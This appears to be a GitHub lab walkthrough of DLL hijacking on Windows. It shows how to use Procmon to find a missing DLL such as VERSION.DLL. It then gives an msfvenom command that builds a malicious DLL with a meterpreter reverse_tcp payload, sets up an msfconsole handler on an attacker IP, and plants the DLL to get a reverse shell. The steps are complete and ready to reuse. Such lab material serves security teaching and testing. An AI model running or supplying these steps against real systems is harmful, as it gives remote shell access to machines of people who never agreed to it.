# DLL Hijacking

DLL files contains executable code that can be used by other applications. When an application needs to use this DLL file, it has to search for it if the absolute path is not provided. If an attacker replaces his own DLL file with the name that the application is searching for, then the application loads the attacker’s DLL and executes the malicious code. This is known as DLL Hijacking Attack.

## Tools Required:
- VMWare, Procmon (Process Monitor), MsfVenom

## Lab Setup
- Create two virtual machine:
  - **Windows OS** for executing exe application *(Victim Machine)*
  - **Kali Linux** for obtain system access using reverse shell handler *(Attacker Machine)*

## POC

> ### **Step-1: Identifying vulnerable DLLs that we can Hijack.**
 - Start Application >> Open Procmon tool 
 - Apply three filters in Procmon (Menu Filter -> Filter)
```
   1. Process Name = contains = "Select Your Application Name" -> [ Add ]
   2. Path         = contains = ".dll"                         -> [ Add ] 
   3. Result       = contains = "NAME NOT FOUND"               -> [ Add ]
     
      Click [ OK ] for apply filters.
```
![Procmon](https://github.com/NayanDZ/DLLHijacking/blob/main/1.jpg)
  
> ### **Step-2: Closed the application and Re-open that application so all the process according to filter will show in** ***Procmon***  

> ### **Step-3: Now find the Dlls which are trying to load from current working application but is not available** ***(e.g: VERSION.DLL)***

![Procmon](https://github.com/NayanDZ/DLLHijacking/blob/main/3.jpg) 
            Application is trying to load VERSION.DLL but not able to find in to application directory.
            
> ### **Step-4: Next step is create malicious DLL named VERSION.DLL using** ***MsfVenom (Kali Linux)***

``` 
   $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.252.130 LPORT=8888 -f dll > VERSION.dll 
```
![MsfVenom](https://github.com/NayanDZ/DLLHijacking/blob/main/4.jpg)

> **Step-5: Now create reverse shell handler with msfconsole**

```
   $ sudo msfconsole
      
   msf > use exploit/multi/handler

   msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   payload => windows/meterpreter/reverse_tcp

   msf exploit(multi/handler) > set LHOST 192.168.252.130  (Replace your attacker machine IP i.e Kali Linux IP)
   LHOST => 192.168.252.130

   msf exploit(multi/handler) > set LPORT 8888
   LPORT => 8888

   msf exploit(multi/handler) > exploit  
```
   Done..! 
![MsfVenom](https://github.com/NayanDZ/DLLHijacking/blob/main/5.jpg)
> **Step-6: Reverse shell handler created, now paste malicious DLL(created through Step-4) in to the application directory and launch application**

   As you can see application is trying to loan the malicious DLL without checking it and we got system reverse shell.

